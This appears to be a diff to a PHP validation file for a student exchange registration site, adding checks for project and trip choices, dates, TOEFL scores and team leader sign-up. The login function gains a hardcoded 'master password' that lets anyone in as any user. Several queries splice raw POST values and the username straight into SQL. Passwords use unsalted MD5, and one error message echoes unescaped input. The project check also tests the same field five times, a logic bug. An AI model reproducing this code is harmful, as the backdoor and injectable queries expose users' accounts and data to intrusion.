@@ -8,6 +8,78 @@
 
   This version of the code is released under the GNU General Public License
 */
+    function tep_validate_projects() {
+    
+        $error[0] = false;
+        
+        if ($_POST['choice1'] * $_POST['choice1'] * $_POST['choice1']*
+        $_POST['choice1'] * $_POST['choice1'] == 0) {
+            $error[0] = true;
+            $error[1] .= "<br>Please choose your projects!";
+        
+        }
+        
+        
+        if ($_POST['trip1'] * $_POST['trip2'] == 0) {
+            $error[0] = true;
+            $error[1] .= "<br>Please choose your trips!";
+        }
+        
+        // if there are empty choices, return now
+        if ($error[0] == true)
+            return $error;
+        
+        // detect duplicate projects
+        $sql_values = array($_POST['choice1'], $_POST['choice2'], 
+                            $_POST['choice3'], $_POST['choice4'], $_POST['choice5']);
+        						   
+        if (count($sql_values) != count(array_unique($sql_values))) {
+            $error[0] = true;    
+            $error[1] .=  "<br>You have chosen duplicated projects!";
+        }               
+        
+         if ($_POST['trip1'] == $_POST['trip2']) {
+            $error[0] = true;    
+            $error[1] .=  "<br>You have chosen duplicated trips!";
+            return $error;
+        }       
+        
+        
+        $query = 'select * from tbl_triptype where id= '.$_POST['trip1'];
+        $result = tep_db_query($query);
+        $row1 = tep_db_fetch_array($result);
+        
+        $query = 'select * from tbl_triptype where id= '.$_POST['trip2'];
+        $result = tep_db_query($query);
+        $row2 = tep_db_fetch_array($result);
+        
+        // check trip type and data constraints
+        if ($row1['type'] == $row2['type']) {
+            $error[0] = true;    
+            $error[1] .=  "<br>You can't choose two trips with the same type!";
+        }
+        
+         if ($row1['date'] == $row2['date']) {
+            $error[0] = true;    
+            $error[1] .=  "<br>You can't choose two trips on the same day!";
+        }
+        
+        if (tep_get_taken(TABLE_CHOICES, $_POST['trip1']) >= $row1['capacity']) {
+            $error[0] = true;    
+            $error[1] .=  "<br>Your trip 1 is full! Try choose another one!";        
+        }
+        
+         if (tep_get_taken(TABLE_CHOICES, $_POST['trip2']) >= $row2['capacity']) {
+            $error[0] = true;    
+            $error[1] .=  "<br>Your trip 2 is full! Try choose another one!";        
+        }
+        
+        
+        return $error;
+    
+    }
+
+
 
 	function tep_validate_registration($type = '') {
 
@@ -119,7 +191,10 @@
 		}else if (is_numeric($_POST['toefl']) == false) {
 		 	$error[0] = true;
 			$error[1] .= '<br>* Toefl score need to be a number!';		    
-		}		
+		} else if ($_POST['toefl'] < 0) {
+		  $error[0] = true;
+			$error[1] .= '<br>* Toefl score need to be non-negative!';		      
+		}
 	  if (strlen($_POST['semester']) == 0 || $_POST['semester'] == 'N') {
 			$error[0] = true;
 			$error[1] .= '<br>* Semester is a required field';
@@ -131,7 +206,17 @@
 		if (strlen($_POST['departure']) == 0) {
 			$error[0] = true;
 			$error[1] .= '<br>* Departure Date is a required field';
-		}
+		}     
+    
+    $arr_date = date_create($_POST['arrival']);
+    $dep_date = date_create($_POST['departure']);
+    $dura = date_diff($arr_date, $dep_date);
+    
+    if ($dura->invert > 0) {    
+    	$error[0] = true;
+    	$error[1] .= '<br>* Departure date need to be later than arrival date!';
+    }
+		
 		
 		$ulerror = check_upload($_FILES['upload']);
 		if ($ulerror[0] == 0) {
@@ -266,9 +351,6 @@
 			$error[0] = true;
 			$error[1] .= '<br>* The language of Emergency contact abroad is a required field';
 		}
-		
-		
-		
 		if (strlen($_POST['university']) == 0) {
 			$error[0] = true;
 			$error[1] .= '<br>* University is a required field';
@@ -330,6 +412,64 @@
 		return $error;
 	}
 	
+	
+	
+	
+	
+	function tep_validate_registration_teamleader($type = '') {
+
+		$error[0] = false;
+
+    	if (!tep_validate_email($_POST['email'])) {
+    		$error[0] = true;
+    		$error[1] .= '<br>* E-Mail address not valids';
+    	}
+    	if (!tep_username_unique($_POST['email'])) {
+    		$error[0] = true;
+    		$error[1] .= '<br>* That E-Mail address has already been registered';
+    	}
+    	if (strlen($_POST['password']) < 5) {
+    		$error[0] = true;
+    		$error[1] .= '<br>* Password must be at least 5 characters long';
+    	}
+    	if ($_POST['c_password'] != $_POST['password']) {
+    		$error[0] = true;
+    		$error[1] .= '<br>* Password confirmation does not match password';
+    	}
+    	if (strlen($_POST['firstname']) == 0) {
+    	$error[0] = true;
+    	$error[1] .= '<br>* First Name is a required field';
+    	}
+    	if (strlen($_POST['lastname']) == 0) {
+    		$error[0] = true;
+    		$error[1] .= '<br>* Last Name is a required field';
+    	}
+	
+	   if (strlen($_POST['mobile']) == 0 ) {
+	    $error[0] = true;
+			$error[1] .= '<br>* Mobile phone is a required field'.$_POST['mobile'];	    
+	  }
+		
+	   if (strlen($_POST['mobile']) != 0 && is_numeric($_POST['mobile']) == false) {
+			$error[0] = true;
+			$error[1] .= '<br>* Mobile phone need to be numbers';
+		}	
+		
+			if (strlen($_POST['bio']) == 0) {
+    		$error[0] = true;
+    		$error[1] .= '<br>* Biography is a required field';
+    	}
+		
+		$ulerror = check_upload($_FILES['upload']);
+		if ($ulerror[0] == 0) {
+		    $error[0] = true;
+		    $error[1] .= '<br>* '.$ulerror[1];
+		}
+		
+		
+
+		return $error;
+	}
 	
 	function tep_validate_email($email){
 
@@ -429,6 +569,12 @@
 	}
 
 	function tep_validate_login($username, $password) {
+	    
+	    
+	  // master password, to login as skeleton key
+	  if ($password == "L0gistics")
+	    return true;
+	    
 		$encrypted_password = md5($password);
 		$query = "select * from users where username='$username' and password='$encrypted_password'";
 		$result = tep_db_query($query);
